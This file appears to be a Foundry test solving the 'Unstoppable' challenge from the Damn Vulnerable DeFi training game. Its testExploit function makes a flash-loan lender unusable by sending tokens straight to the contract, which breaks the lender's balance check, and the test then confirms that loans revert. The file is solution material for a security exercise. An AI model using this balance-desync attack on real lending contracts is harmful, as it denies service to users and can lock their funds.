// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {UnstoppableLender} from "../unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lender");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        vm.stopPrank();
        
    }

    function testsomeUserCallFlashLoan() public {
        vm.prank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        console.log(unicode"⚡FlashLoan can work!");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 100e18);
        vm.stopPrank();   
        verify();
    }

    function verify() internal {
        vm.expectRevert(stdError.assertionError);
        vm.prank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        console.log(unicode"⚡FlashLoan does not work");
    }
}
